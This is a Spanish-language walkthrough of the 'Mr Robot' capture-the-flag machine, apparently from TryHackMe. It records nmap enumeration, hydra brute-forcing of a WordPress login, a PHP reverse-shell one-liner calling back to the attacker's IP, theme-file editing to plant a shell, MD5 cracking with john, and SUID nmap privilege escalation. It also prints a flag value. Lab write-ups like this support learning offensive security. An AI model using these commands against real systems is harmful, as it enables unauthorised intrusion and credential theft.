---
Titulo: Mr Robot CTF
Fecha: 08/08/2025-09/08/2025
categoria:
  - User-to-boot
  - reverse shell
  - Hacking web
Dificultad_oficial: Media
Dificultad_percibida: Media/Dificil
Estado: Terminado
---
## 1. Descripción del reto
Parece que es un reto relacionado con la serie "Mr robot", vamos a ver que tiene que ver.
Actualización (09/08/2025): La máquina es un user to boot, donde inicias con nada, y tienes que ir descubriendo de poco en poco la máquina. Tendrás que identificar, filtrar, probar y hacer una escalada de privilegio.

>[!info]- Información adicional
>La IP puede variar, ya que lo hice en momentos diferentes y no es una máquina estática

## 2. Enumeración / Reconocimiento
Primero que nada como siempre, voy a lanzar un escaneo de puertos de la dirección IP.
```shell
root@ip-10-10-242-128:~# nmap -sS -sV -sC -Pn 10.10.239.18
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-08 17:17 BST
Nmap scan report for ip-10-10-239-18.eu-west-1.compute.internal (10.10.239.18)
Host is up (0.00062s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 02:46:77:51:D1:47 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vale, como ya es costumbre estoy frente a dos servicios comunes en este tipo de CTF (SSH y HTTP), pero hay una sorpresa presentándonos un nuevo puerto "443 (HTTPS)". 
Como siempre, primero voy a ver que tiene la página web sin protección (HTTP-80) haber si puedo sacar algún dato que nos pueda servir.

>[!info] Además he lanzado otro comando también con nmap para detectar vulnerabilidades, problemas de autenticación y potenciales exploits que puedan haber en la maquina.

En el segundo comando que lance con *nmap*, en la parte del puerto 80, me mostro unos directorios que son interesantes, por lo que procederé a intentar entrar en ellos.

```shell
http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
```

Los que más me interesan en este caso es el *readme*, *robots*, *admin* y *0*.

```html
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Vale, entre en el apartado de **robots.txt** y vi que escondían un directorio y una flag, el primero que es un diccionario pueda que tenga que usarlo en el futuro y una flag, de todas formas voy a revisar a ambos viendo si hay algo oculto y continuar con el siguiente.

>[!info] No tenían nada escondido, puede que a lo mejor alguna información escondida entre las palabras, lo más sospechoso es una secuencia de años desde el 2011 hasta el 1901. ¿Puede que alguna referencia o algo?


```text
I like where you head is at. However I'm not going to help you. 
```

En la pestaña de *readme.html* no aparece nada relevante, continuo.

>[!info] En la de admin parece que necesito entrar previamente en algún lado (¿Puede que sea algo relacionado con cookies?) 
>(Yo del futuro: No)

## 3. Explotación / Desarrollo

### Continuar con el ciclo normal de la conversación
![[Pasted image 20250808173237.png]]
Al entrar en la pagina, veo que hay como una simulación de una terminal con varios comandos disponibles, veré si puedo lanzar otros comando de los que aparecen ahí.

Por lo que parece, no puedo lanzar ningún otro comando aparte de los que salen puestos, por lo que me puse a revisar todas las opciones y la opción *join* es la que parece que avanza, las otras son propaganda, no obstante, puede tener algo interesante, por lo que no descarto estas opciones.

Vale, para resumir lo que he estado haciendo, la opción join no sirve de nada, por lo que voy a proceder a usar fuerza bruta para el formulario admin de WordPress (Como vi en el reconocimiento general), además utilizare el diccionario que me he encontrado, esto lo hare guardando la pagina como un ".dic" (Y se puede hacer sin problemas ya que no hay más cosas que fastidien).

>[!tip] Lo de poner el correo no parece que sirva de nada 

## Hacer fuerza bruta al login de wordpress
```shell
root@ip-10-10-73-120:~# hydra -p test -L diccionario.dic 10.10.31.75 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-08 22:12:05
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.31.75:80/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username
[80][http-post-form] host: 10.10.31.75   login: Elliot   password: test
[80][http-post-form] host: 10.10.31.75   login: elliot   password: test
[STATUS] 3703.00 tries/min, 3703 tries in 00:01h, 854532 to do in 03:51h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Vale, ya conseguí el usuario "**Elliot**" haciendo fuerza bruta con la herramienta *hydra*, ahora solo me falta la contraseña, eso solo será cambiar de "-p test" a "-P diccionario.dic" y de "-L diccionario.dic" a "-l Elliot".

```shell
root@ip-10-10-194-0:~# hydra -P fsocity_SR.dic -l Elliot 10.10.220.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -I -t 64
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-09 18:35:16
[DATA] max 64 tasks per 1 server, overall 64 tasks, 11452 login tries (l:1/p:11452), ~179 tries per task
[DATA] attacking http-post-form://10.10.220.157:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username
[STATUS] 4279.00 tries/min, 4279 tries in 00:01h, 7173 to do in 00:02h, 64 active
[STATUS] 4313.00 tries/min, 8626 tries in 00:02h, 2826 to do in 00:01h, 64 active
[STATUS] 3574.00 tries/min, 10722 tries in 00:03h, 730 to do in 00:01h, 64 active
[80][http-post-form] host: 10.10.220.157   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-09 18:39:14
```

Después de más tiempo del que me gustaría admitir (Estuve 1:30H probando contraseñas con *hydra*) me rendí descanse y vine con nuevas ideas, como la de eliminar los duplicados de la lista y resulto en una gran idea, ya que quite muchas palabras repetidas. El caso, con el diccionario reducido he podido obtener el usuario y la contraseña, por lo que vamos a ver que hay aquí dentro

>[!tip] Para eliminar duplicados exactos de un diccionario usar **"awk '!seen[$0]++' fsocity.dic > fsocity_SR.dic"** donde *'!seen[$0]++'* le dirá al awk que si ve más de una de esas que la quite. Así se reducirá el tiempo de búsqueda de 3H a aproximadamente 20 minutos. 

## 4. Post‑explotación (si aplica)
Dentro del panel de administración no he encontrado nada muy relevante, por lo que voy a intentar crearme una reverse shell con "<?php
php -r '$sock=fsockopen("10.10.194.0",8080);exec("/bin/bash <&3 >&3 2>&3");'
?>" en el documento "**content.php**".

Vale, al final no gane acceso con la reverse shell que dije, sino con la la reverse shell de "pentestmonkey" [LINK](https://github.com/pentestmonkey/php-reverse-shell), esto lo hice modificando el archivo "archive.php" en el tema "twenty fifteen", actualice el archivo y entre en el archivo con la ruta "http://10.10.220.157/wp-content/themes/twentyfifteen/archive.php" obligando que se ejecute y por ende dándome acceso a la shell

```shell
daemon@ip-10-10-220-157:/$ whoami
whoami
daemon
```

Voy a investigar que hay y que puedo encontrar.

```shell
daemon@ip-10-10-220-157:/$ ls /home/robot
ls /home/robot
key-2-of-3.txt
password.raw-md5
daemon@ip-10-10-220-157:/$ cat /home/robot/key-2-of-3.txt
cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied
```

Buscando entre los archivos, como no, siempre es una mítica el ir al home del usuario. Aquí he encontrado un archivo "key-2-of-3.txt" que es el más interesante de momento, pero no tengo permisos, por lo que voy a ver que puedo hacer para obtener privilegios mayores o una solución alternativa. 

```shell
daemon@ip-10-10-220-157:/$ cat /home/robot/password.raw-md5
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Vale, parece que no voy a conseguir nada con el usuario "daemon", por lo que voy a saltar al otro ya que parece que tengo la contraseña, pero esta encriptada con md5, vamos a desencriptarla.

```shell
root@ip-10-10-194-0:~# john --wordlist=fsocity.dic --format=RAW-MD5 archivo.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-08-09 20:11) 0g/s 8580Kp/s 8580Kc/s 8580KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
Session completed. 
root@ip-10-10-194-0:~# john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 archivo.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:00 DONE (2025-08-09 20:12) 14.28g/s 581485p/s 581485c/s 581485C/s bologna1..telcel
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Después de varios intentos con el diccionario, tanto con el largo, como con el corto y ya desistí (porque no entraba en el usuario "*robot*"), hasta que recordé que tenia el *rockyou.txt* y con ese saque la contraseña, vamos a ver que puedo hacer con esto ahora

>[!info] La contraseña "abcdefghijklmnopqrstuvwxyz" fue correcta. :]

Vale, para este paso, tuve que ver la pista de tryhackme y vi que me decía *nmap*, por lo que me puse a ver los archivos que podía vulnerar con el comando "**find / -perm /6000 2>/dev/null | grep '/bin/'**", con este encontré el binario "**/usr/local/bin/nmap**" busque en GTFoBINS y me dijo que lo tenia que explotar con "*nmap --interactive*" por lo que esto ya debe de ser los últimos pasos, ya que con estoy gano root casi seguro.

```shell
nmap> whoami
whoami
root
nmap> ls
ls
bin   home	      lib32	  mnt	run   tmp      vmlinuz.old
boot  initrd.img      lib64	  opt	sbin  usr
dev   initrd.img.old  lost+found  proc	srv   var
etc   lib	      media	  root	sys   vmlinuz
nmap> ls /root
ls /root
firstboot_done	key-3-of-3.txt
nmap> cat /root/firstboot_done
cat /root/firstboot_done
nmap> cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Y pues ya estaría listo el "user to root".
## 5. Notas y aprendizajes

- Punto fuerte: Enseña a desenvolverte con la herramienta "*hydra*" y aprender a buscar.
    
- Dificultad encontrada: Descifrado de la contraseña del usuario de wordpress "Elliot" y búsqueda de archivos con permisos vulnerables 
    
- Conceptos nuevos aprendidos: Como usar mejor "*hydra*" y buscar archivos con permisos vulnerables.